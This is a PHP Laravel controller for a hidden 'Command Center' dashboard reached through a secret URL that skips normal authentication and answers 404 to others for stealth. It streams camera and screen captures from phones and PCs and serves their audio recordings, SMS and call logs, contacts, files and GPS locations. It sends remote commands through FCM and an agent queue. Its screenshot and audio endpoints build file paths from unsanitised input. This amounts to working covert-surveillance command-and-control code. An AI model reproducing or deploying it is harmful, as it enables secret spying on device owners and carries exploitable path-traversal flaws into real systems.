<?php

namespace App\Http\Controllers;

use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Log;

/**
 * CommandCenterController
 *
 * Web-based monitoring dashboard accessible via secret URL.
 * Bypasses Sanctum auth — reads directly from Cache.
 *
 * Access: GET /cc/{token}
 * If token is invalid → 404 (stealth)
 */
class CommandCenterController extends Controller
{
    private const CACHE_KEY = 'active_cameras';
    private const DEVICES_KEY = 'camera_devices';
    private const MODULES_KEY = 'device_active_modules';

    /**
     * Validate the secret token.
     */
    private function validateToken(string $token): bool
    {
        $expected = config('command-center.legacy_secret_url.token');

        return config('command-center.legacy_secret_url.enabled', false)
            && is_string($expected)
            && $expected !== ''
            && hash_equals($expected, $token);
    }

    /**
     * Render the Command Center dashboard.
     */
    public function index(string $token)
    {
        if (!$this->validateToken($token)) {
            abort(404);
        }

        return view('command-center.index', [
            'token' => $token,
        ]);
    }

    /**
     * API: List all registered devices with status.
     */
    public function apiDevices(string $token): JsonResponse
    {
        if (!$this->validateToken($token)) {
            abort(404);
        }

        $devices = Cache::get(self::DEVICES_KEY, []);
        $cameras = Cache::get(self::CACHE_KEY, []);

        $result = [];
        foreach ($devices as $name => $device) {
            $cam = $cameras[$name] ?? null;
            $ip = $cam['local_ip'] ?? ($device['local_ip'] ?? null);
            $activeModules = $this->getActiveModules($name);
            $status = $this->getDeviceStatus($device, $cameras, $name, $activeModules);

            $result[] = [
                'device_name' => $device['device_name'],
                'is_streaming' => isset($cameras[$name]),
                'status' => $status,
                'active_modules' => $activeModules,
                'last_heartbeat_at' => $device['last_heartbeat_at'] ?? null,
                'screen_on' => $device['screen_on'] ?? null,
                'local_ip' => $ip,
                'port' => $cam['port'] ?? null,
                'lens' => $cam['lens'] ?? null,
                'stream_url' => $cam['stream_url'] ?? null,
                'registered_at' => $cam['registered_at'] ?? ($device['registered_at'] ?? null),
                'source' => $device['source'] ?? 'mobile',
            ];
        }

        // Merge Windows Agent managed devices (PCs) from database
        $managedDevices = \App\Models\ManagedDevice::where('platform', 'windows')
            ->select(['uuid', 'device_name', 'hostname', 'os_version', 'last_heartbeat_at', 'capabilities'])
            ->get();

        $existingNames = collect($result)->pluck('device_name')->toArray();

        foreach ($managedDevices as $md) {
            // Skip if already registered via Cache (from AgentStreamController)
            if (in_array($md->device_name, $existingNames)) {
                continue;
            }

            $offlineThreshold = now()->subSeconds(config('command-center.agent.offline_after_seconds', 180));
            $isOnline = $md->last_heartbeat_at && $md->last_heartbeat_at->gt($offlineThreshold);
            $activeModules = $this->getActiveModules($md->device_name);
            $isStreaming = !empty($activeModules);

            $result[] = [
                'device_name' => $md->device_name,
                'is_streaming' => $isStreaming,
                'status' => $isStreaming ? 'live' : ($isOnline ? 'online' : 'offline'),
                'active_modules' => $activeModules,
                'last_heartbeat_at' => $md->last_heartbeat_at?->toIso8601String(),
                'screen_on' => true,
                'local_ip' => null,
                'port' => null,
                'lens' => null,
                'stream_url' => null,
                'registered_at' => $md->created_at?->toIso8601String(),
                'source' => 'windows_agent',
                'uuid' => $md->uuid,
                'os_version' => $md->os_version,
            ];
        }

        // Sort: live first, then online, then offline
        usort($result, function ($a, $b) {
            $order = ['live' => 0, 'online' => 1, 'offline' => 2];
            return ($order[$a['status']] ?? 3) <=> ($order[$b['status']] ?? 3);
        });

        return response()->json(['data' => $result]);
    }

    /**
     * API: Get device info (cached device-info data).
     */
    public function apiDeviceInfo(string $token, string $name): JsonResponse
    {
        if (!$this->validateToken($token)) {
            abort(404);
        }

        $cacheKey = "device_info_{$name}";
        $info = Cache::get($cacheKey);

        if (!$info) {
            return response()->json(['data' => null, 'message' => 'No device info available']);
        }

        return response()->json(['data' => $info]);
    }

    /**
     * API: Get latest camera frame (JPEG binary).
     */
    public function apiFrame(string $token, string $name)
    {
        if (!$this->validateToken($token)) {
            abort(404);
        }

        $type = request()->query('type', 'camera');
        $suffix = match ($type) {
            'screen' => '_screen',
            'snapshot' => '_snapshot',
            default => '',
        };
        $filename = md5($name) . $suffix . '.jpg';
        $path = storage_path('app/frames/' . $filename);

        if (!file_exists($path)) {
            // Return 1x1 transparent pixel as fallback
            $pixel = base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
            return response($pixel, 200)
                ->header('Content-Type', 'image/gif')
                ->header('Cache-Control', 'no-cache');
        }

        $jpeg = file_get_contents($path);
        return response($jpeg, 200)
            ->header('Content-Type', 'image/jpeg')
            ->header('Cache-Control', 'no-cache, no-store, must-revalidate')
            ->header('Access-Control-Allow-Origin', '*');
    }

    /**
     * API: Send command to a device via FCM (mobile) or Agent Command queue (PC).
     */
    public function apiCommand(string $token, string $name, Request $request): JsonResponse
    {
        if (!$this->validateToken($token)) {
            abort(404);
        }

        $action = $request->input('action', 'START');
        $lens = $request->input('lens', 'BACK');

        // On STOP commands: remove from active cameras cache
        if (in_array($action, ['STOP', 'SCREEN_STOP', 'CAMERA_STOP', 'AUDIO_STOP'])) {
            $cameras = Cache::get(self::CACHE_KEY, []);
            unset($cameras[$name]);
            $screenName = $name . ' [Layar]';
            unset($cameras[$screenName]);
            Cache::put(self::CACHE_KEY, $cameras, now()->addMinutes(10));
        }

        // Track active modules
        $this->updateActiveModules($name, $action);

        // Check if this is a Windows Agent device (PC)
        $managedDevice = \App\Models\ManagedDevice::where('device_name', $name)
            ->where('platform', 'windows')
            ->first();

        if ($managedDevice) {
            return $this->sendAgentCommand($managedDevice, $action, $request);
        }

        // Mobile device: send via FCM
        $devices = Cache::get(self::DEVICES_KEY, []);
        $device = $devices[$name] ?? null;

        if (!$device || empty($device['fcm_token'])) {
            return response()->json(['success' => false, 'message' => 'Device not found or no FCM token'], 404);
        }

        // Determine FCM message type
        $isScreenCommand = str_starts_with($action, 'SCREEN_');
        $isTextCommand = str_starts_with($action, 'TEXT_');
        $isLocationCommand = str_starts_with($action, 'LOCATION_');
        $isAudioCommand = str_starts_with($action, 'AUDIO_');
        $isRemoteCommand = str_starts_with($action, 'REMOTE_');

        if ($isRemoteCommand) {
            $fcmType = 'remote_command';
            $fcmAction = str_replace('REMOTE_', '', $action);
        } elseif ($isAudioCommand) {
            $fcmType = 'audio_command';
            $fcmAction = str_replace('AUDIO_', '', $action);
        } elseif ($isLocationCommand) {
            $fcmType = 'location_command';
            $fcmAction = str_replace('LOCATION_', '', $action);
        } elseif ($isTextCommand) {
            $fcmType = 'text_command';
            $fcmAction = str_replace('TEXT_', '', $action);
        } elseif ($isScreenCommand) {
            $fcmType = 'screen_command';
            $fcmAction = str_replace('SCREEN_', '', $action);
        } else {
            $fcmType = 'camera_command';
            $fcmAction = $action;
        }

        $fcmData = [
            'type' => $fcmType,
            'action' => $fcmAction,
            'lens' => $lens,
            'requested_by' => 'CommandCenter',
        ];

        if ($request->input('params')) {
            $fcmData['params'] = $request->input('params');
        }

        $sent = $this->sendFcmV1Message($device['fcm_token'], $fcmData);

        return response()->json([
            'success' => $sent,
            'message' => $sent ? "Command {$action} sent to {$name}" : 'FCM send failed',
        ]);
    }

    /**
     * Route command to a Windows Agent PC via the Agent Command queue.
     * PC Agent polls for commands — no FCM needed.
     */
    private function sendAgentCommand(
        \App\Models\ManagedDevice $device,
        string $action,
        Request $request
    ): JsonResponse {
        // Map CC action names to Agent command names
        $commandName = match ($action) {
            'START' => 'CAMERA_START',
            'STOP' => 'CAMERA_STOP',
            default => $action,
        };

        // Determine executor (companion = user session, service = background)
        $commandConfig = config("command-center.commands.{$commandName}");
        $executor = $commandConfig['executor'] ?? 'companion';

        // Build payload
        $payload = [];
        if ($request->input('lens')) {
            $payload['lens'] = $request->input('lens');
        }
        if ($request->input('quality')) {
            $payload['quality'] = $request->input('quality');
        }
        if ($request->input('params')) {
            $payload = array_merge($payload, (array) $request->input('params'));
        }

        try {
            $command = $device->commands()->create([
                'uuid' => (string) \Illuminate\Support\Str::uuid(),
                'name' => $commandName,
                'version' => 1,
                'executor' => $executor,
                'payload' => $payload ?: null,
                'sensitive' => $commandConfig['sensitive'] ?? false,
                'reason' => 'Command Center web dashboard',
                'status' => \App\Enums\DeviceCommandStatus::Queued,
                'expires_at' => now()->addSeconds($commandConfig['ttl_seconds'] ?? 60),
            ]);

            return response()->json([
                'success' => true,
                'message' => "Command {$commandName} queued for PC {$device->device_name}",
                'command_uuid' => $command->uuid,
                'transport' => 'agent_poll',
            ]);
        } catch (\Exception $e) {
            Log::error('Failed to queue agent command', [
                'device' => $device->device_name,
                'command' => $commandName,
                'error' => $e->getMessage(),
            ]);

            return response()->json([
                'success' => false,
                'message' => 'Gagal mengirim command ke PC: ' . $e->getMessage(),
            ], 500);
        }
    }

    /**
     * API: Get GPS locations for a device.
     */
    public function apiLocations(string $token, string $name): JsonResponse
    {
        if (!$this->validateToken($token)) {
            abort(404);
        }

        $cacheKey = "device_locations_{$name}";
        $locations = Cache::get($cacheKey, []);

        return response()->json(['data' => array_slice($locations, 0, 50)]);
    }

    /**
     * API: Get screenshots for a device.
     */
    public function apiScreenshots(string $token, string $name): JsonResponse
    {
        if (!$this->validateToken($token)) {
            abort(404);
        }

        $dir = storage_path("app/screenshots/{$name}");
        if (!is_dir($dir)) {
            return response()->json(['data' => []]);
        }

        $files = array_diff(scandir($dir, SCANDIR_SORT_DESCENDING), ['.', '..']);
        $screenshots = [];
        foreach (array_slice($files, 0, 20) as $file) {
            $screenshots[] = [
                'filename' => $file,
                'url' => url("/cc/{$token}/api/screenshot-file/{$name}/{$file}"),
                'size' => filesize("{$dir}/{$file}"),
                'created_at' => date('Y-m-d H:i:s', filemtime("{$dir}/{$file}")),
            ];
        }

        return response()->json(['data' => $screenshots]);
    }

    /**
     * Serve a screenshot file.
     */
    public function apiScreenshotFile(string $token, string $name, string $filename)
    {
        if (!$this->validateToken($token)) {
            abort(404);
        }

        $path = storage_path("app/screenshots/{$name}/{$filename}");
        if (!file_exists($path)) {
            abort(404);
        }

        return response()->file($path, [
            'Content-Type' => 'image/jpeg',
            'Cache-Control' => 'max-age=3600',
        ]);
    }

    // ─── MJPEG Stream Proxy ──────────────────────────────

    /**
     * Proxy MJPEG stream — watches storage/app/frames for new frames
     * and sends them as multipart/x-mixed-replace (same as MobileCameraController::streamRelay).
     */
    public function apiStream(string $token, string $name)
    {
        if (!$this->validateToken($token)) {
            abort(404);
        }

        $type = request()->query('type', 'camera');
        $suffix = $type === 'screen' ? '_screen' : '';
        $filename = md5($name) . $suffix . '.jpg';
        $path = storage_path('app/frames/' . $filename);

        set_time_limit(300);
        ini_set('zlib.output_compression', '0');

        $boundary = 'ccboundary';

        header('Content-Type: multipart/x-mixed-replace; boundary=' . $boundary);
        header('Cache-Control: no-cache, no-store, must-revalidate');
        header('Pragma: no-cache');
        header('Access-Control-Allow-Origin: *');
        header('X-Accel-Buffering: no');
        header('Connection: keep-alive');

        while (ob_get_level()) {
            ob_end_flush();
        }

        $startTime = time();
        $maxDuration = 300;
        $lastSize = 0;
        $lastMtime = 0;

        while ((time() - $startTime) < $maxDuration) {
            if (connection_aborted()) break;

            clearstatcache(true, $path);

            if (!file_exists($path)) {
                usleep(100000);
                continue;
            }

            $mtime = filemtime($path);
            $size = filesize($path);

            if ($mtime === $lastMtime && $size === $lastSize) {
                usleep(30000);
                continue;
            }

            $jpeg = @file_get_contents($path);

            if ($jpeg && strlen($jpeg) > 100) {
                $lastMtime = $mtime;
                $lastSize = $size;
                $len = strlen($jpeg);

                echo "--{$boundary}\r\n";
                echo "Content-Type: image/jpeg\r\n";
                echo "Content-Length: {$len}\r\n";
                echo "\r\n";
                echo $jpeg;
                echo "\r\n";

                flush();
            }

            usleep(50000);
        }

        exit(0);
    }

    // ─── Activity Logs ───────────────────────────────────

    /**
     * Get activity logs for a device (reads from storage/app/activity_logs/).
     */
    public function apiActivityLogs(string $token, string $name): JsonResponse
    {
        if (!$this->validateToken($token)) {
            abort(404);
        }

        $dir = storage_path('app/activity_logs/' . md5($name));

        if (!is_dir($dir)) {
            return response()->json(['data' => []]);
        }

        $files = glob($dir . '/*.json');
        rsort($files);
        $files = array_slice($files, 0, 50);

        $logs = [];
        foreach ($files as $file) {
            $content = @file_get_contents($file);
            if ($content) {
                $entry = json_decode($content, true);
                if ($entry) {
                    $logs[] = $entry;
                }
            }
        }

        return response()->json(['data' => $logs]);
    }

    // ─── Audio ───────────────────────────────────────────

    /**
     * Get audio recordings list for a device.
     */
    public function apiAudioList(string $token, string $name): JsonResponse
    {
        if (!$this->validateToken($token)) {
            abort(404);
        }

        $dir = storage_path('app/audio/' . md5($name));

        if (!is_dir($dir)) {
            return response()->json(['data' => []]);
        }

        $metaFiles = glob($dir . '/*.json');
        rsort($metaFiles);
        $metaFiles = array_slice($metaFiles, 0, 30);

        $entries = [];
        foreach ($metaFiles as $mf) {
            $content = @file_get_contents($mf);
            if ($content) {
                $entry = json_decode($content, true);
                if ($entry) {
                    // Add download URL
                    $entry['url'] = url("/cc/{$token}/api/audio-file/{$name}/{$entry['filename']}");
                    $entries[] = $entry;
                }
            }
        }

        return response()->json(['data' => $entries]);
    }

    /**
     * Serve audio file for playback (NOT delete after send — web needs replay).
     */
    public function apiAudioFile(string $token, string $name, string $filename)
    {
        if (!$this->validateToken($token)) {
            abort(404);
        }

        $path = storage_path('app/audio/' . md5($name) . '/' . $filename);

        if (!file_exists($path)) {
            abort(404);
        }

        return response()->file($path, [
            'Content-Type' => 'audio/aac',
            'Cache-Control' => 'no-cache',
            'Accept-Ranges' => 'bytes',
        ]);
    }

    // ─── SMS Logs ────────────────────────────────────────

    /**
     * Get SMS logs for a device.
     */
    public function apiSmsLogs(string $token, string $name): JsonResponse
    {
        if (!$this->validateToken($token)) {
            abort(404);
        }

        $path = storage_path('app/monitor/sms/' . md5($name) . '.json');

        if (!file_exists($path)) {
            return response()->json(['data' => []]);
        }

        $data = json_decode(file_get_contents($path), true);
        return response()->json(['data' => $data['messages'] ?? []]);
    }

    // ─── Call Logs ───────────────────────────────────────

    /**
     * Get call logs for a device.
     */
    public function apiCallLogs(string $token, string $name): JsonResponse
    {
        if (!$this->validateToken($token)) {
            abort(404);
        }

        $path = storage_path('app/monitor/calls/' . md5($name) . '.json');

        if (!file_exists($path)) {
            return response()->json(['data' => []]);
        }

        $data = json_decode(file_get_contents($path), true);
        return response()->json(['data' => $data['calls'] ?? []]);
    }

    // ─── Contacts ────────────────────────────────────────

    /**
     * Get contacts for a device.
     */
    public function apiContacts(string $token, string $name): JsonResponse
    {
        if (!$this->validateToken($token)) {
            abort(404);
        }

        $path = storage_path('app/monitor/contacts/' . md5($name) . '.json');

        if (!file_exists($path)) {
            return response()->json(['data' => []]);
        }

        $data = json_decode(file_get_contents($path), true);
        return response()->json(['data' => $data['contacts'] ?? []]);
    }

    // ─── Files ───────────────────────────────────────────

    /**
     * Get file list for a device.
     */
    public function apiFiles(string $token, string $name): JsonResponse
    {
        if (!$this->validateToken($token)) {
            abort(404);
        }

        $path = storage_path('app/monitor/files/' . md5($name) . '.json');

        if (!file_exists($path)) {
            return response()->json(['data' => []]);
        }

        $data = json_decode(file_get_contents($path), true);
        return response()->json(['data' => $data['files'] ?? []]);
    }

    // ─── Device Detail Info ──────────────────────────────

    /**
     * Get detailed device info (hardware, battery, etc).
     */
    public function apiDeviceDetail(string $token, string $name): JsonResponse
    {
        if (!$this->validateToken($token)) {
            abort(404);
        }

        $infoPath = storage_path('app/device-info/' . md5($name) . '.json');
        $appPath = storage_path('app/app-list/' . md5($name) . '.json');

        $info = file_exists($infoPath) ? json_decode(file_get_contents($infoPath), true) : [];
        $apps = file_exists($appPath) ? json_decode(file_get_contents($appPath), true) : [];

        return response()->json([
            'info' => $info,
            'apps' => $apps['apps'] ?? [],
        ]);
    }

    // ─── Private Helpers ────────────────────────────────

    private function getDeviceStatus(array $device, array $cameras, string $name, array $activeModules): string
    {
        if (isset($cameras[$name]) || !empty($activeModules)) {
            return 'live';
        }

        $heartbeat = $device['last_heartbeat_at'] ?? null;
        if ($heartbeat) {
            try {
                $lastBeat = \Carbon\Carbon::parse($heartbeat);
                if ($lastBeat->diffInMinutes(now()) < 5) {
                    return 'online';
                }
            } catch (\Exception $e) {}
        }

        return 'offline';
    }

    private function getActiveModules(string $deviceName): array
    {
        $allModules = Cache::get(self::MODULES_KEY, []);
        return $allModules[$deviceName] ?? [];
    }

    private function updateActiveModules(string $deviceName, string $action): void
    {
        $allModules = Cache::get(self::MODULES_KEY, []);
        $modules = $allModules[$deviceName] ?? [];

        $addMap = [
            'START' => 'camera', 'SCREEN_START' => 'screen', 'TEXT_START' => 'text',
            'LOCATION_GET' => 'location', 'LOCATION_START' => 'location',
            'AUDIO_RECORD' => 'audio', 'AUDIO_LIVE_START' => 'audio',
        ];
        $removeMap = [
            'STOP' => 'camera', 'SCREEN_STOP' => 'screen', 'TEXT_STOP' => 'text',
            'LOCATION_STOP' => 'location', 'AUDIO_STOP' => 'audio',
        ];

        if (isset($addMap[$action])) {
            $modules = array_unique(array_merge($modules, [$addMap[$action]]));
        }
        if (isset($removeMap[$action])) {
            $modules = array_values(array_diff($modules, [$removeMap[$action]]));
        }

        $allModules[$deviceName] = array_values($modules);
        Cache::put(self::MODULES_KEY, $allModules, now()->addHours(6));
    }

    /**
     * Send FCM v1 API message.
     * Uses same config keys as MobileCameraController.
     */
    private function sendFcmV1Message(string $fcmToken, array $data): bool
    {
        $serviceAccountPath = config('services.fcm.service_account_path');
        $projectId = config('services.fcm.project_id', 'kabensatudata');

        if (!$serviceAccountPath || !file_exists($serviceAccountPath)) {
            Log::warning('FCM service account file not found: ' . $serviceAccountPath);
            return false;
        }

        try {
            $accessToken = $this->getAccessToken($serviceAccountPath);
            if (!$accessToken) return false;

            $response = \Illuminate\Support\Facades\Http::withHeaders([
                'Authorization' => "Bearer {$accessToken}",
                'Content-Type' => 'application/json',
            ])->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
                'message' => [
                    'token' => $fcmToken,
                    'data' => array_map('strval', $data),
                    'android' => [
                        'priority' => 'high',
                    ],
                ],
            ]);

            if ($response->successful()) {
                Log::info('CC FCM v1 sent successfully');
                return true;
            }

            Log::error('CC FCM v1 error: ' . $response->body());
            return false;
        } catch (\Exception $e) {
            Log::error('CC FCM v1 exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Get OAuth2 access token from Google Service Account JSON.
     * Shares cache key with MobileCameraController.
     */
    private function getAccessToken(string $serviceAccountPath): ?string
    {
        $cached = Cache::get('fcm_access_token');
        if ($cached) return $cached;

        $sa = json_decode(file_get_contents($serviceAccountPath), true);
        if (!$sa) return null;

        $now = time();
        $header = base64_encode(json_encode(['alg' => 'RS256', 'typ' => 'JWT']));
        $payload = base64_encode(json_encode([
            'iss' => $sa['client_email'],
            'scope' => 'https://www.googleapis.com/auth/firebase.messaging',
            'aud' => 'https://oauth2.googleapis.com/token',
            'iat' => $now,
            'exp' => $now + 3600,
        ]));

        // URL-safe base64
        $header = rtrim(strtr($header, '+/', '-_'), '=');
        $payload = rtrim(strtr($payload, '+/', '-_'), '=');

        $unsigned = "{$header}.{$payload}";

        $privateKey = openssl_pkey_get_private($sa['private_key']);
        if (!$privateKey) {
            Log::error('CC FCM: Invalid private key');
            return null;
        }

        openssl_sign($unsigned, $signature, $privateKey, OPENSSL_ALGO_SHA256);
        $sig = rtrim(strtr(base64_encode($signature), '+/', '-_'), '=');

        $jwt = "{$unsigned}.{$sig}";

        $response = \Illuminate\Support\Facades\Http::asForm()->post('https://oauth2.googleapis.com/token', [
            'grant_type' => 'urn:ietf:params:oauth:grant-type:jwt-bearer',
            'assertion' => $jwt,
        ]);

        if ($response->successful()) {
            $token = $response->json('access_token');
            $expiresIn = $response->json('expires_in', 3600);
            Cache::put('fcm_access_token', $token, now()->addSeconds($expiresIn - 300));
            return $token;
        }

        Log::error('CC FCM OAuth error: ' . $response->body());
        return null;
    }
}
